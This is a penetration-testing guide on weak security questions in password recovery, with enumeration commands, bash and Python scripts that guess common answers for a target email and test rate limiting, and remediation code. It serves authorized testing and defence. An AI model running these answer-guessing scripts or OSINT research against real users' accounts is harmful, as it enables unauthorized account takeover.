# WSTG-ATHN-08: Testing for Weak Security Question Answer

## Test ID
WSTG-ATHN-08

## Test Name
Testing for Weak Security Question Answer

## High-Level Description

Security questions are often used as a secondary authentication mechanism for password recovery. This test evaluates whether security questions provide adequate protection or are vulnerable to guessing, research, or social engineering attacks. Weak security questions can allow attackers to bypass authentication entirely by providing easily guessable or publicly available answers.

---

## What to Check

### Security Question Issues

- [ ] Easily guessable questions
- [ ] Publicly researchable answers
- [ ] Limited question choices
- [ ] No answer format requirements
- [ ] No rate limiting on attempts
- [ ] Case-sensitive matching issues

### Question Categories

| Category | Risk Level |
|----------|------------|
| Mother's maiden name | High (public records) |
| Pet's name | High (social media) |
| School name | High (LinkedIn) |
| City of birth | High (public) |
| Favorite color | High (limited options) |
| Custom questions | Low-Medium |

---

## How to Test

### Step 1: Enumerate Available Questions

```bash
# Get available security questions
curl -s "https://target.com/api/security-questions" | jq '.'

# During registration
curl -s "https://target.com/register" | \
    grep -iE "security.question|select.*question" -A 50

# During password reset
curl -s "https://target.com/forgot-password" | \
    grep -iE "security.question|select.*question" -A 50
```

### Step 2: Analyze Question Strength

```bash
# Document all available questions
# Evaluate each for:
# 1. Public availability of answer
# 2. Limited answer set
# 3. Researchability
# 4. Social engineering risk

# Common weak questions to look for:
# - What is your mother's maiden name?
# - What is your pet's name?
# - What city were you born in?
# - What is your favorite color?
# - What is your favorite movie?
# - What high school did you attend?
# - What is your favorite sports team?
```

### Step 3: Test Answer Guessing

```bash
#!/bin/bash
# Test common answers for typical questions

# Favorite color
colors=("blue" "red" "green" "purple" "black" "white" "pink" "yellow")

for color in "${colors[@]}"; do
    response=$(curl -s -X POST "https://target.com/api/verify-security-answer" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"victim@example.com\",\"answer\":\"$color\"}")

    if echo "$response" | grep -qi "success\|correct\|token"; then
        echo "[SUCCESS] Answer found: $color"
        break
    fi
done

# Pet names
pets=("max" "buddy" "charlie" "lucy" "bella" "daisy" "rocky" "jack")

for pet in "${pets[@]}"; do
    response=$(curl -s -X POST "https://target.com/api/verify-security-answer" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"victim@example.com\",\"answer\":\"$pet\"}")

    if echo "$response" | grep -qi "success"; then
        echo "[SUCCESS] Pet name: $pet"
        break
    fi
done
```

### Step 4: Test Rate Limiting

```bash
#!/bin/bash
# Test if there's rate limiting on answer attempts

for i in {1..50}; do
    response=$(curl -s -X POST "https://target.com/api/verify-security-answer" \
        -H "Content-Type: application/json" \
        -d '{"email":"test@example.com","answer":"wrong'$i'"}' \
        -w "\n%{http_code}")

    status=$(echo "$response" | tail -1)

    if [ "$status" == "429" ]; then
        echo "Rate limited after $i attempts"
        break
    fi

    echo "Attempt $i: $status"
done

if [ "$i" -eq 50 ]; then
    echo "[VULN] No rate limiting - 50 attempts successful"
fi
```

### Step 5: Test Answer Format Validation

```bash
# Test minimum answer length
answers=("a" "ab" "abc" "test" "longer answer")

for answer in "${answers[@]}"; do
    response=$(curl -s -X POST "https://target.com/api/set-security-question" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"question_id\":1,\"answer\":\"$answer\"}")

    echo "Answer '$answer' (len ${#answer}): $response" | head -c 100
    echo ""
done

# Test case sensitivity
curl -s -X POST "https://target.com/api/set-security-question" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"question_id":1,"answer":"MyAnswer"}'

# Verify with different case
curl -s -X POST "https://target.com/api/verify-security-answer" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","answer":"myanswer"}'
```

### Step 6: Test Multiple Question Requirement

```bash
# Check if multiple questions are required
curl -s "https://target.com/forgot-password?email=test@example.com" | \
    grep -c "question"

# If only one question, test the process
curl -s -X POST "https://target.com/api/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com"}'

# Check response for number of questions
```

### Step 7: Test Information Disclosure

```bash
# Check if questions are revealed for any user
curl -s "https://target.com/api/security-question?email=victim@example.com"

# This reveals what question to research for the target
# Should require some authentication first
```

---

## Tools

### Answer Guessing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Intruder** | Automated guessing | Wordlist attacks |
| **Custom scripts** | Targeted attacks | Common answers |
| **OSINT tools** | Research | Social media mining |

### Research

| Source | Information |
|--------|-------------|
| **Social media** | Pets, favorites |
| **LinkedIn** | Schools, employers |
| **Public records** | Birth city, maiden names |

---

## Example Commands/Payloads

### Security Question Tester

```python
#!/usr/bin/env python3
import requests

class SecurityQuestionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    # Common answers for weak questions
    COMMON_ANSWERS = {
        "color": ["blue", "red", "green", "black", "purple", "pink", "white", "yellow"],
        "pet": ["max", "buddy", "charlie", "lucy", "bella", "daisy", "rocky", "jack", "bear", "duke"],
        "city": ["new york", "los angeles", "chicago", "houston", "philadelphia", "phoenix", "san diego"],
        "team": ["yankees", "cowboys", "lakers", "patriots", "giants", "bears", "packers"],
        "movie": ["star wars", "godfather", "avatar", "titanic", "matrix", "inception"],
        "food": ["pizza", "steak", "pasta", "sushi", "tacos", "burgers", "chicken"],
        "car": ["ford", "toyota", "honda", "bmw", "mercedes", "chevrolet", "tesla"],
    }

    def get_questions(self, email=None):
        """Get available security questions"""
        url = f"{self.base_url}/api/security-questions"
        if email:
            url += f"?email={email}"

        response = self.session.get(url)
        return response.json() if response.status_code == 200 else None

    def analyze_question(self, question):
        """Analyze question strength"""
        question_lower = question.lower()

        weakness = {
            "question": question,
            "risk": "unknown",
            "issues": []
        }

        # Check for weak question types
        weak_patterns = {
            "maiden name": ("High", "Public records searchable"),
            "pet": ("High", "Often on social media"),
            "born": ("High", "Public records"),
            "school": ("High", "LinkedIn/Facebook"),
            "color": ("High", "Very limited options"),
            "team": ("High", "Social media posts"),
            "first car": ("Medium", "May be shared publicly"),
            "best friend": ("Medium", "Social media"),
            "movie": ("Medium", "Limited popular options"),
        }

        for pattern, (risk, reason) in weak_patterns.items():
            if pattern in question_lower:
                weakness["risk"] = risk
                weakness["issues"].append(reason)

        if not weakness["issues"]:
            weakness["risk"] = "Unknown"
            weakness["issues"].append("Requires manual analysis")

        return weakness

    def brute_force_answer(self, email, answer_type, max_attempts=50):
        """Attempt to guess security answer"""
        answers = self.COMMON_ANSWERS.get(answer_type, [])

        for i, answer in enumerate(answers[:max_attempts]):
            response = self.session.post(
                f"{self.base_url}/api/verify-security-answer",
                json={"email": email, "answer": answer}
            )

            if response.status_code == 429:
                return {"status": "rate_limited", "attempts": i + 1}

            if "success" in response.text.lower() or "token" in response.text.lower():
                return {"status": "success", "answer": answer, "attempts": i + 1}

        return {"status": "failed", "attempts": len(answers)}

    def test_rate_limiting(self, email, num_attempts=100):
        """Test rate limiting on answer attempts"""
        for i in range(num_attempts):
            response = self.session.post(
                f"{self.base_url}/api/verify-security-answer",
                json={"email": email, "answer": f"wrong{i}"}
            )

            if response.status_code == 429:
                return {"rate_limited": True, "after_attempts": i + 1}

        return {"rate_limited": False, "attempts_tested": num_attempts}

    def generate_report(self, questions):
        """Generate security question analysis report"""
        print("\n=== SECURITY QUESTION ANALYSIS ===\n")

        if not questions:
            print("No questions retrieved")
            return

        for q in questions:
            analysis = self.analyze_question(q.get("question", q))
            print(f"Question: {analysis['question']}")
            print(f"  Risk Level: {analysis['risk']}")
            for issue in analysis['issues']:
                print(f"  Issue: {issue}")
            print()

# Usage
tester = SecurityQuestionTester("https://target.com")
questions = tester.get_questions()
tester.generate_report(questions)
print(tester.test_rate_limiting("test@example.com"))
```

---

## Remediation Guide

### 1. Eliminate Security Questions

```python
# Best option: Don't use security questions at all
# Use alternative recovery methods:

def forgot_password(email):
    """Secure password recovery without security questions"""

    user = User.query.filter_by(email=email).first()

    if user:
        # Generate secure token
        token = generate_secure_token()

        # Store token with expiration
        PasswordReset.create(
            user_id=user.id,
            token=hash_token(token),
            expires_at=datetime.utcnow() + timedelta(hours=1)
        )

        # Send email with reset link
        send_password_reset_email(user.email, token)

    # Always return same response to prevent enumeration
    return {"message": "If the email exists, a reset link has been sent"}
```

### 2. If Security Questions Required, Implement Strong Controls

```python
class SecureSecurityQuestions:
    MINIMUM_ANSWER_LENGTH = 4
    MAX_ATTEMPTS = 3
    LOCKOUT_DURATION = 3600  # 1 hour

    def __init__(self, redis_client):
        self.redis = redis_client

    def validate_answer_format(self, answer):
        """Validate answer meets minimum requirements"""
        if len(answer) < self.MINIMUM_ANSWER_LENGTH:
            return False, f"Answer must be at least {self.MINIMUM_ANSWER_LENGTH} characters"

        return True, None

    def verify_answer(self, user_id, provided_answer):
        """Verify answer with rate limiting"""
        attempt_key = f"security_question_attempts:{user_id}"

        # Check lockout
        if self.redis.exists(f"security_question_locked:{user_id}"):
            return False, "Account temporarily locked"

        # Increment attempts
        attempts = self.redis.incr(attempt_key)
        if attempts == 1:
            self.redis.expire(attempt_key, 3600)

        if attempts > self.MAX_ATTEMPTS:
            # Lock account
            self.redis.setex(f"security_question_locked:{user_id}", self.LOCKOUT_DURATION, "1")
            return False, "Too many attempts. Account locked."

        # Get stored answer
        user = User.query.get(user_id)

        # Normalize comparison (case-insensitive, trim whitespace)
        stored_normalized = user.security_answer.lower().strip()
        provided_normalized = provided_answer.lower().strip()

        if stored_normalized == provided_normalized:
            # Clear attempts on success
            self.redis.delete(attempt_key)
            return True, None

        return False, f"Incorrect answer. {self.MAX_ATTEMPTS - attempts} attempts remaining"

    def require_multiple_questions(self, user_id):
        """Require multiple questions to be answered"""
        # Implement 2+ questions for password reset
        pass
```

### 3. Alternative: Use Knowledge-Based Authentication (KBA)

```python
# Dynamic KBA based on user history/data
class DynamicKBA:
    def generate_questions(self, user):
        """Generate questions based on user's data"""
        questions = []

        # Transaction-based questions
        if user.transactions:
            recent = random.choice(user.transactions[-10:])
            questions.append({
                "question": "What was the amount of your transaction on [date]?",
                "answer": str(recent.amount)
            })

        # Account activity questions
        if user.devices:
            device = random.choice(user.devices)
            questions.append({
                "question": "What type of device did you last login from?",
                "answer": device.type
            })

        return random.sample(questions, min(3, len(questions)))
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Single easily guessable question | 8.8 | High |
| No rate limiting on attempts | 7.5 | High |
| Questions revealed without auth | 5.3 | Medium |
| Very short answers allowed | 5.3 | Medium |
| Only one question required | 6.5 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-640** | Weak Password Recovery Mechanism for Forgotten Password | Security questions |
| **CWE-307** | Improper Restriction of Excessive Authentication Attempts | No rate limiting |
| **CWE-521** | Weak Password Requirements | Weak answer policy |

---

## References

- [OWASP WSTG - Testing for Weak Security Question Answer](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)

---

## Checklist

```
[ ] Available questions enumerated
[ ] Question strength analyzed
[ ] Rate limiting tested
[ ] Answer format requirements tested
[ ] Case sensitivity tested
[ ] Common answers tested
[ ] Question disclosure tested
[ ] Multiple questions requirement checked
[ ] OSINT research potential evaluated
[ ] Lockout mechanism tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
